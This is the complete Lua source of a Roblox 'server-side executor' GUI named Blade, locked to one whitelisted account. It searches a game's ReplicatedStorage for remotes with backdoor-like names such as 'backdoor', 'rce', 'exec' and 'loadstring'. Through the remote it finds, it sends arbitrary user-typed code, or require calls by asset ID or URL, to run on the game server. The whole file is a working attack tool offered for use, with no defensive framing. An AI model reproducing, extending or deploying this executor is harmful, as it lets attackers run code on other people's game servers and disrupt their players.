local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Only allow this player
local WHITELIST = {
    Usernames = {"BladeServerSide"},
    UserIds = {7992020269}
}
local BLACKLIST = {
    Usernames = {},
    UserIds = {}
}

-- Only allow remotes whose names contain these substrings (case-insensitive)
local whitelistedBackdoorFragments = {
    "jen", "bd", "backdoor", "cmd", "control", "admin", "remote", "exploit", "script", "sus",
    "hack", "hax", "exec", "run", "rce", "module", "owner", "server", "sv", "svcmd", "svch",
    "troll", "main", "command", "scriptinject", "loadstring", "require"
}
for i, v in ipairs(whitelistedBackdoorFragments) do
    whitelistedBackdoorFragments[i] = v:lower()
end

local function isWhitelistedBackdoorRemote(name)
    name = name:lower()
    for _, frag in ipairs(whitelistedBackdoorFragments) do
        if string.find(name, frag, 1, true) then
            return true
        end
    end
    return false
end

local function findWhitelistedBackdoorRemote()
    for _, obj in ipairs(ReplicatedStorage:GetChildren()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and isWhitelistedBackdoorRemote(obj.Name) then
            return obj
        end
    end
    return nil
end

local function isPlayerAllowed(player)
    -- Blacklist overrides whitelist
    for _, name in ipairs(BLACKLIST.Usernames) do
        if player.Name:lower() == name:lower() then
            return false, "Blacklisted"
        end
    end
    for _, id in ipairs(BLACKLIST.UserIds) do
        if player.UserId == id then
            return false, "Blacklisted"
        end
    end
    for _, name in ipairs(WHITELIST.Usernames) do
        if player.Name:lower() == name:lower() then
            return true, "Whitelisted"
        end
    end
    for _, id in ipairs(WHITELIST.UserIds) do
        if player.UserId == id then
            return true, "Whitelisted"
        end
    end
    return false, "Not whitelisted"
end

-- GUI and logic below
if PlayerGui:FindFirstChild("Blade") then
    PlayerGui.Blade:Destroy()
end

local Blade = Instance.new("ScreenGui")
Blade.Name = "Blade"
Blade.Parent = PlayerGui
Blade.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Blade.ResetOnSpawn = false

local Frame = Instance.new("Frame")
Frame.Parent = Blade
Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.119683482, 0, 0.211316392, 0)
Frame.Size = UDim2.new(0, 775, 0, 515)
Frame.Active = true
Frame.Draggable = true

local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 212, 41)),
    ColorSequenceKeypoint.new(0.49, Color3.fromRGB(255, 142, 43)),
    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 212, 41))
}
UIGradient.Parent = Frame

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 16)
UICorner.Parent = Frame

local Inject = Instance.new("TextButton")
Inject.Name = "Inject"
Inject.Parent = Frame
Inject.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Inject.BorderColor3 = Color3.fromRGB(0, 0, 0)
Inject.BorderSizePixel = 0
Inject.Position = UDim2.new(0.0155, 0, 0.8893, 0)
Inject.Size = UDim2.new(0, 53, 0, 50)
Inject.Font = Enum.Font.SourceSans
Inject.Text = "Inject"
Inject.TextColor3 = Color3.fromRGB(255, 255, 255)
Inject.TextSize = 10

local UICorner_2 = Instance.new("UICorner")
UICorner_2.CornerRadius = UDim.new(0, 16)
UICorner_2.Parent = Inject

local Execute = Instance.new("TextButton")
Execute.Name = "Execute"
Execute.Parent = Frame
Execute.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
Execute.BorderSizePixel = 0
Execute.Position = UDim2.new(0.6477, 0, 0.8893, 0)
Execute.Size = UDim2.new(0, 53, 0, 50)
Execute.Font = Enum.Font.SourceSans
Execute.Text = "Execute"
Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
Execute.TextSize = 10

local UICorner_3 = Instance.new("UICorner")
UICorner_3.CornerRadius = UDim.new(0, 16)
UICorner_3.Parent = Execute

local TextBox = Instance.new("TextBox")
TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.0213, 0, 0.1612, 0)
TextBox.Size = UDim2.new(0, 538, 0, 363)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 193, 142)
TextBox.TextSize = 14
TextBox.TextWrapped = true
TextBox.MultiLine = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextBox.ClearTextOnFocus = false

local List = Instance.new("ScrollingFrame")
List.Name = "List"
List.Parent = Frame
List.Active = true
List.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
List.BorderColor3 = Color3.fromRGB(0, 0, 0)
List.BorderSizePixel = 0
List.Position = UDim2.new(0.7265, 0, 0.1612, 0)
List.Size = UDim2.new(0, 201, 0, 363)
List.CanvasSize = UDim2.new(0,0,0,0)
List.ScrollBarThickness = 6

local SaveFile = Instance.new("TextButton")
SaveFile.Name = "SaveFile"
SaveFile.Parent = Frame
SaveFile.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
SaveFile.BorderColor3 = Color3.fromRGB(0, 0, 0)
SaveFile.BorderSizePixel = 0
SaveFile.Position = UDim2.new(0.0955, 0, 0.8893, 0)
SaveFile.Size = UDim2.new(0, 53, 0, 50)
SaveFile.Font = Enum.Font.SourceSans
SaveFile.Text = "Save File"
SaveFile.TextColor3 = Color3.fromRGB(255, 255, 255)
SaveFile.TextSize = 10

local UICorner_4 = Instance.new("UICorner")
UICorner_4.CornerRadius = UDim.new(0, 16)
UICorner_4.Parent = SaveFile

local OpenFile = Instance.new("TextButton")
OpenFile.Name = "OpenFile"
OpenFile.Parent = Frame
OpenFile.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
OpenFile.BorderColor3 = Color3.fromRGB(0, 0, 0)
OpenFile.BorderSizePixel = 0
OpenFile.Position = UDim2.new(0.1729, 0, 0.8893, 0)
OpenFile.Size = UDim2.new(0, 53, 0, 50)
OpenFile.Font = Enum.Font.SourceSans
OpenFile.Text = "Open File"
OpenFile.TextColor3 = Color3.fromRGB(255, 255, 255)
OpenFile.TextSize = 10

local UICorner_5 = Instance.new("UICorner")
UICorner_5.CornerRadius = UDim.new(0, 16)
UICorner_5.Parent = OpenFile

local Clear = Instance.new("TextButton")
Clear.Name = "Clear"
Clear.Parent = Frame
Clear.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Clear.BorderColor3 = Color3.fromRGB(0, 0, 0)
Clear.BorderSizePixel = 0
Clear.Position = UDim2.new(0.2542, 0, 0.8893, 0)
Clear.Size = UDim2.new(0, 53, 0, 50)
Clear.Font = Enum.Font.SourceSans
Clear.Text = "Clear"
Clear.TextColor3 = Color3.fromRGB(255, 255, 255)
Clear.TextSize = 10

local UICorner_6 = Instance.new("UICorner")
UICorner_6.CornerRadius = UDim.new(0, 16)
UICorner_6.Parent = Clear

local Status = Instance.new("ImageLabel")
Status.Name = "Status"
Status.Parent = Frame
Status.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Status.BackgroundTransparency = 1
Status.BorderColor3 = Color3.fromRGB(0, 0, 0)
Status.BorderSizePixel = 0
Status.Position = UDim2.new(0.3032, 0, 0.026, 0)
Status.Size = UDim2.new(0, 69, 0, 63)
Status.Image = "rbxassetid://9216573897"
Status.ImageColor3 = Color3.fromRGB(255, 0, 0)

local Logo = Instance.new("ImageLabel")
Logo.Name = "Logo"
Logo.Parent = Frame
Logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Logo.BackgroundTransparency = 1
Logo.BorderColor3 = Color3.fromRGB(0, 0, 0)
Logo.BorderSizePixel = 0
Logo.Position = UDim2.new(0.0207, 0, 0.0124, 0)
Logo.Size = UDim2.new(0, 255, 0, 76)
Logo.Image = "rbxassetid://79568934686196"

local injected = false
local recentScripts = {}
local backdoor = nil

local function notify(title, text, duration)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = duration or 3
        })
    end)
end

local function updateList()
    List:ClearAllChildren()
    for i, scriptText in ipairs(recentScripts) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, 0, 0, 30)
        btn.Position = UDim2.new(0, 0, 0, (i-1)*32)
        btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Text = "Script " .. i
        btn.Font = Enum.Font.SourceSans
        btn.TextSize = 14
        btn.Parent = List
        btn.MouseButton1Click:Connect(function()
            TextBox.Text = scriptText
        end)
    end
    List.CanvasSize = UDim2.new(0,0,0,math.max(0,#recentScripts*32))
end

Inject.MouseButton1Click:Connect(function()
    local allowed, reason = isPlayerAllowed(LocalPlayer)
    if not allowed then
        notify("Blade", "Access denied: " .. reason, 3)
        injected = false
        backdoor = nil
        Status.ImageColor3 = Color3.fromRGB(255, 0, 0)
        return
    end

    if injected then
        notify("Blade", "Already Injected", 2)
        return
    end

    backdoor = findWhitelistedBackdoorRemote()

    if backdoor and (backdoor:IsA("RemoteEvent") or backdoor:IsA("RemoteFunction")) then
        injected = true
        Status.ImageColor3 = Color3.fromRGB(0, 255, 0)
        notify("Blade", "Injected via " .. backdoor.Name, 2)
    else
        injected = false
        backdoor = nil
        Status.ImageColor3 = Color3.fromRGB(255, 0, 0)
        notify("Blade", "No whitelisted backdoor remote found", 2)
    end
end)

local function handleRequire(code)
    local assetId = string.match(code, "require%((%d+)%)")
    local username = string.match(code, ".text%(\"([^\"]+)\"%)")
    local URLID = string.match(code, 'require%("([^"]+)"%)')

    if URLID then
        return "requireURL", URLID
    elseif assetId then
        return "requireRoblox", assetId, username
    end

    return "execute", code
end

Execute.MouseButton1Click:Connect(function()
    if not injected or not backdoor then
        notify("Blade", "Not Injected or no backdoor found", 2)
        return
    end

    local code = TextBox.Text
    if code and code ~= "" then
        table.insert(recentScripts, 1, code)
        if #recentScripts > 10 then
            table.remove(recentScripts, 11)
        end
        updateList()

        pcall(function()
            local action, arg1, arg2 = handleRequire(code)
            if backdoor:IsA("RemoteEvent") then
                if action == "requireRoblox" then
                    backdoor:FireServer("requireRoblox", arg1, arg2)
                elseif action == "requireURL" then
                    backdoor:FireServer("requireURL", arg1)
                else
                    backdoor:FireServer("execute", code)
                end
            elseif backdoor:IsA("RemoteFunction") then
                if action == "requireRoblox" then
                    backdoor:InvokeServer("requireRoblox", arg1, arg2)
                elseif action == "requireURL" then
                    backdoor:InvokeServer("requireURL", arg1)
                else
                    backdoor:InvokeServer("execute", code)
                end
            else
                notify("Blade", "Invalid Backdoor", 2)
            end
        end)
    end
end)

Clear.MouseButton1Click:Connect(function()
    TextBox.Text = ""
end)

SaveFile.MouseButton1Click:Connect(function()
    if TextBox.Text ~= "" then
        table.insert(recentScripts, 1, TextBox.Text)
        if #recentScripts > 10 then
            table.remove(recentScripts, 11)
        end
        updateList()
        notify("Blade", "Script saved to recent list", 2)
    end
end)

OpenFile.MouseButton1Click:Connect(function()
    if #recentScripts > 0 then
        TextBox.Text = recentScripts[1]
        notify("Blade", "Loaded most recent script", 2)
    end
end)

updateList()
